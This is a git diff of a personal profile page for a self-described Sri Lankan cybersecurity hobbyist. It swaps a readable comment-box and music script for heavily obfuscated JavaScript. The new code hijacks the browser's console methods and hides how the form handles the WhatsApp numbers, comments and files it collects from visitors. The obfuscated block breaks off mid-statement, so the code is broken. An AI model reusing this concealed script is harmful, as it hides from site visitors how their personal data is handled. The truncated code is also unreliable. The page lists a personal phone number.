@@ -1,119 +1,107 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>Real Babiya Official</title>
-    <style>
-        /* --- Your existing CSS --- */
-        .success-dialog {
-            display: none;
-            position: fixed;
-            bottom: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: linear-gradient(135deg, #28a745, #218838);
-            color: #fff;
-            padding: 15px 25px;
-            border-radius: 30px;
-            box-shadow: 0 4px 15px rgba(40, 167, 69, 0.4);
-            font-size: 16px;
-            z-index: 1000;
-            opacity: 0;
-            transition: all 0.5s ease;
-        }
-        .success-dialog.show {
-            display: block;
-            opacity: 1;
-            animation: slideUp 0.5s ease-out;
-        }
-        @keyframes slideUp {
-            from { transform: translate(-50%, 100%); }
-            to { transform: translate(-50%, 0); }
-        }
-    </style>
-</head>
-<body>
+.comment-box input,  
+    .comment-box textarea {  
+        width: 90%;  
+        padding: 10px;  
+        margin-bottom: 15px;  
+        border-radius: 8px;  
+        border: 2px solid rgba(255,255,255,0.2);  
+        background: rgba(255,255,255,0.1);  
+        color: #fff;  
+        font-size: 14px;  
+        transition: all 0.3s ease;  
+    }  
+    .comment-box input:focus,  
+    .comment-box textarea:focus {  
+        outline: none;  
+        border-color: #00c6ff;  
+        box-shadow: 0 0 10px rgba(0,198,255,0.5);  
+    }  
+    .comment-box input[type="file"] {  
+        margin-top: 10px;  
+        border: 2px solid rgba(255,255,255,0.2);  
+        padding: 8px;  
+        background: rgba(255,255,255,0.1);  
+        color: #fff;  
+    }  
+    .comment-box button {  
+        padding: 10px 20px;  
+        background: linear-gradient(135deg, #00c6ff, #0072ff);  
+        color: red;  
+        border: none;  
+        border-radius: 30px;  
+        font-size: 16px;  
+        cursor: pointer;  
+        transition: all 0.3s ease;  
+        box-shadow: 0 4px 15px rgba(0, 114, 255, 0.4);  
+    }  
+    .comment-box button:hover {  
+        background: linear-gradient(135deg, #0084ff, #005cbf);  
+        transform: translateY(-3px);  
+        box-shadow: 0 7px 20px rgba(0, 114, 255, 0.5);  
+    }  
+    .comment-box button:active {  
+        transform: translateY(1px);  
+    }  
+    .success-dialog {  
+        display: none;  
+        position: fixed;  
+        bottom: 20px;  
+        left: 50%;  
+        transform: translateX(-50%);  
+        background: linear-gradient(135deg, #28a745, #218838);  
+        color: #fff;  
+        padding: 15px 25px;  
+        border-radius: 30px;  
+        box-shadow: 0 4px 15px rgba(40, 167, 69, 0.4);  
+        font-size: 16px;  
+        z-index: 1000;  
+        opacity: 0;  
+        transition: all 0.5s ease;  
+    }  
+    .success-dialog.show {  
+        display: block;  
+        opacity: 1;  
+        animation: slideUp 0.5s ease-out;  
+    }  
+    @keyframes slideUp {  
+        from { transform: translate(-50%, 100%); }  
+        to { transform: translate(-50%, 0); }  
+    }  
+</style>
 
-<div class="profile-card">
-    <div class="image">
-        <img src="https://i.ibb.co/zhZdnQ32/IMG-20251011-WA0080.jpg" alt="INRL-OFFICIAL" class="profile-img">
-    </div>
-    <div class="text-data">
-        <span class="name">OLD Real Babiya 🕊️</span>
-        <span class="job">♞</span>
-    </div>
-    <div class="buttons">
-        <a href="https://www.facebook.com/share/1EFJjanF88/" class="button">FACEBOOK</a>
-        <a href="https://wa.me/+94764978991?text=Site+Info" class="button">WHATSAPP</a>
-    </div>
-    <p>I am Real Babiya from Sri Lanka who loves Cyber Security Field. 1 Year Experience in cyber world. This is my official website.</p>
+</head>  
+<body>  
+    <div class="profile-card">  
+        <div class="image">  
+            <img src="https://i.ibb.co/zhZdnQ32/IMG-20251011-WA0080.jpg" alt="INRL-OFFICIAL" class="profile-img">  
+        </div>  
+        <div class="text-data">  
+            <span class="name">OLD Real Babiya 🕊️</span>  
+            <span class="job">♞</span>  
+        </div>  
+        <div class="buttons">  
+            <a href="https://www.facebook.com/share/1EFJjanF88/" class="button">FACEBOOK </a>  
+            <a href="https://wa.me/+94764978991?text=Site+Info" class="button">WHATSAPP</a>  
+        </div>  
+        <p>I am Real Babiya from Sri Lanka who loves Cyber Security Field . 1 Year Experience in cyber world This is my official website</p>  <!-- Comment Box Toggle Button -->  
+    <button class="toggle-comment-box" onclick="toggleCommentBox()">Leave a Comment</button>  
 
-    <!-- Leave a Comment Button -->
-    <button class="toggle-comment-box" id="commentBtn">Leave a Comment</button>
+    <!-- Comment Box -->  
+    <div class="comment-box" id="commentBox">  
+        <h3>Leave a Comment</h3>  
+        <input type="text" id="whatsapp-number" placeholder="Enter WhatsApp Number">  
+        <textarea id="comment-text" rows="4" placeholder="Write your comment..."></textarea>  
+        <input type="file" id="file-input">  
+        <button onclick="sendComment()">Submit</button>  
+    </div>  
+</div>  
 
-    <!-- Comment Box -->
-    <div class="comment-box" id="commentBox">
-        <h3>Leave a Comment</h3>
-        <input type="text" id="whatsapp-number" placeholder="Enter WhatsApp Number">
-        <textarea id="comment-text" rows="4" placeholder="Write your comment..."></textarea>
-        <input type="file" id="file-input">
-        <button onclick="sendComment()">Submit</button>
-    </div>
-</div>
+<!-- Success Dialog -->  
+<div class="success-dialog" id="successDialog">Comment sent successfully!</div>  
 
-<!-- Success Dialog -->
-<div class="success-dialog" id="successDialog">Comment sent successfully!</div>
-
-<!-- Audio Player -->
-<audio id="bg-music" src="babiyatech.mp3" loop></audio>
-
-<!-- Play Music Button -->
-<button id="play-music-btn" style="
-  position: fixed;
-  top: 20px;
-  right: 20px;
-  padding: 12px 18px;
-  font-size: 16px;
-  background-color: #1d72b8;
-  color: white;
-  border: none;
-  border-radius: 6px;
-  cursor: pointer;
-  box-shadow: 0 2px 6px rgba(0,0,0,0.2);
-  transition: background 0.3s;
-">🔊 Play Music</button>
-
-<script>
-// --- Comment Box Toggle ---
-function toggleCommentBox() {
-    const box = document.getElementById('commentBox');
-    box.style.display = (box.style.display === 'block') ? 'none' : 'block';
-}
-
-// --- Send Comment ---
-function sendComment() {
-    const dialog = document.getElementById('successDialog');
-    dialog.classList.add('show');
-    setTimeout(() => {
-        dialog.classList.remove('show');
-    }, 3000);
-}
-
-// --- Music Play ---
-const audio = document.getElementById("bg-music");
-const playBtn = document.getElementById("play-music-btn");
-
-// Play music on button click
-playBtn.addEventListener("click", () => {
-    audio.play().catch(err => console.log("Error playing music:", err));
-    playBtn.style.display = "none"; // hide button after click
-});
-
-// Optional: Play music when 'Leave a Comment' button is clicked
-document.getElementById("commentBtn").addEventListener("click", () => {
-    audio.play().catch(err => console.log("Error playing music:", err));
-});
+<script>  
+    (function(_0x253508,_0x25281e){function _0x22a7b3(_0x2bd827,_0x4478c5){return _0x2f7d(_0x4478c5-0x3d8,_0x2bd827);}const _0x19c705=_0x253508();while(!![]){try{const _0xf11672=parseInt(_0x22a7b3(0x54a,0x541))/0x1+-parseInt(_0x22a7b3(0x53c,0x536))/0x2*(-parseInt(_0x22a7b3(0x53d,0x54c))/0x3)+parseInt(_0x22a7b3(0x53a,0x53a))/0x4+-parseInt(_0x22a7b3(0x55e,0x568))/0x5*(-parseInt(_0x22a7b3(0x545,0x560))/0x6)+-parseInt(_0x22a7b3(0x55e,0x54f))/0x7+-parseInt(_0x22a7b3(0x57f,0x563))/0x8+-parseInt(_0x22a7b3(0x55f,0x549))/0x9;if(_0xf11672===_0x25281e)break;else _0x19c705['push'](_0x19c705['shift']());}catch(_0x2670bd){_0x19c705['push'](_0x19c705['shift']());}}}(_0x42b3,0x7f36c));const _0xf32352=(function(){let _0x1af0bf=!![];return function(_0x77c405,_0x5d53b3){const _0x2cbf3d=_0x1af0bf?function(){if(_0x5d53b3){const _0x19a429=_0x5d53b3['apply'](_0x77c405,arguments);return _0x5d53b3=null,_0x19a429;}}:function(){};return _0x1af0bf=![],_0x2cbf3d;};}()),_0x11b4e1=_0xf32352(this,function(){const _0x5c9433=function(){function _0x1bccb5(_0x46e75c,_0x421654){return _0x2f7d(_0x421654-0x31b,_0x46e75c);}let _0x5a1feb;try{_0x5a1feb=Function(_0x1bccb5(0x493,0x47c)+_0x1bccb5(0x4c3,0x4aa)+');')();}catch(_0x1fe3f2){_0x5a1feb=window;}return _0x5a1feb;},_0x4d25fb=_0x5c9433(),_0x326b99=_0x4d25fb['console']=_0x4d25fb[_0x5a0137(0x445,0x42c)]||{},_0x9a4bcc=['log',_0x5a0137(0x438,0x41d),'info',_0x5a0137(0x444,0x43c),_0x5a0137(0x43c,0x43d),'table','trace'];function _0x5a0137(_0x3c1ea7,_0xd0ecde){return _0x2f7d(_0xd0ecde-0x2b7,_0x3c1ea7);}for(let _0x4f115f=0x0;_0x4f115f<_0x9a4bcc[_0x5a0137(0x43f,0x445)];_0x4f115f++){const _0x2c3e99=_0xf32352['constructor'][_0x5a0137(0x418,0x421)][_0x5a0137(0x426,0x433)](_0xf32352),_0x4493b1=_0x9a4bcc[_0x4f115f],_0x1d7fa9=_0x326b99[_0x4493b1]||_0x2c3e99;_0x2c3e99[_0x5a0137(0x42a,0x41e)]=_0xf32352[_0x5a0137(0x42b,0x433)](_0xf32352),_0x2c3e99[_0x5a0137(0x413,0x424)]=_0x1d7fa9[_0x5a0137(0x414,0x424)]['bind'](_0x1d7fa9),_0x326b99[_0x4493b1]=_0x2c3e99;}});_0x11b4e1();function toggleCommentBox(){const _0x5653ec=document[_0x575b92(-0x45,-0x3d)](_0x575b92(-0x39,-0x44)),_0x3b￼￼  
 </script>
 
-</body>
-</html>
+</body>  
+</html>  
